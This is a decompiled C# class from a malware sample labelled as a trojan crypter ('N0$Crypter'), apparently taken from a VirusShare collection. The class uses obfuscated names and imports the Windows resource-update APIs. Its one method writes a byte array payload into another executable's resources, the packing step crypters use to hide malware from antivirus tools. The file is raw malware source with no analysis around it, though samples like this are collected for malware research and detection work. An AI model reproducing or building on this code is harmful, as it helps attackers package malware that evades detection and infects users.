// Decompiled with JetBrains decompiler
// Type: A.TB
// Assembly: N0$Crypter, Version=3.0.7.1, Culture=neutral, PublicKeyToken=null
// MVID: FD276B3A-BCAA-4176-AE7A-13B114112E73
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.MSIL.Crypt.hae-91602cc2011b8768f677252d0fce055cd9e20323cd9c86736de5f27b67249290.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.InteropServices;

namespace A
{
  [StandardModule]
  internal sealed class TB
  {
    [DllImport("kernel32.dll", EntryPoint = "UpdateResource", SetLastError = true)]
    private static extern bool A(
      uint _param0,
      bool _param1,
      bool _param2,
      bool _param3,
      int _param4,
      uint _param5);

    [DllImport("kernel32.dll", EntryPoint = "BeginUpdateResource", SetLastError = true)]
    private static extern IntPtr A(string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1);

    [DllImport("kernel32.dll", EntryPoint = "EndUpdateResource", SetLastError = true)]
    private static extern bool A(IntPtr _param0, bool _param1);

    public static bool A(string _param0, byte[] _param1)
    {
      byte[] numArray = _param1;
      IntPtr num1 = TB.A(_param0, false);
      GCHandle gcHandle = FI.A((object) _param1, GCHandleType.Pinned);
      int num2 = PCB.A(num1);
      DateTime dateTime1 = GG.A();
      int num3 = TCB.A(ref dateTime1);
      int num4 = QCB.A(RCB.A(ref num3, (IFormatProvider) MS.A())) ? 1 : 0;
      DateTime dateTime2 = GG.A();
      int num5 = TCB.A(ref dateTime2);
      int num6 = QCB.A(RCB.A(ref num5, (IFormatProvider) MS.A())) ? 1 : 0;
      DateTime dateTime3 = GG.A();
      int num7 = SCB.A(ref dateTime3);
      int num8 = QCB.A(RCB.A(ref num7, (IFormatProvider) MS.A())) ? 1 : 0;
      int num9 = PCB.A(CI.A(ref gcHandle));
      int num10 = (int) OCB.A((object) numArray.Length);
      TB.A((uint) num2, num4 != 0, num6 != 0, num8 != 0, num9, (uint) num10);
      TB.A(num1, false);
      return true;
    }
  }
}
